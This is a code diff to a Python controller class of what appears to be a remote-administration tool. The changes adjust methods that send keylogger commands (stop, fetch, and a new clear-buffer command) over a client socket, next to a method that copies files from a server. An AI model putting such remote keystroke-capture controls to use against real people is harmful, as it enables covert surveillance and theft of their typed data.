@@ -189,16 +189,18 @@ class cl_controller:
     def stop_keylogger(self, client_socket):
         if self.is_logging:
             self.is_logging = False        
-            self.model.send_command(client_socket, "STOP_KEYLOGGER")            
-            response = self.model.receive_response_utf8(client_socket)       
-            return response
+            self.model.send_command(client_socket, "STOP_KEYLOGGER")
 
     def print_keylogger(self, client_socket):
         response = ""
         self.model.send_command(client_socket, "FETCH_KEYLOGGER")  
-        time.sleep(1)
+        time.sleep(0.1)
         response = self.model.receive_response_utf8(client_socket) 
         return response
+    
+    def clear_buffer_keylogger(self, client_socket):
+        self.model.send_command(client_socket, "CLEAR_BUFFER_KEYLOGGER")  
+
         
     #----------6. DEL & COPY FILE --------------------------
     def get_files_from_server(self, client_socket, file_path, destination_path): 
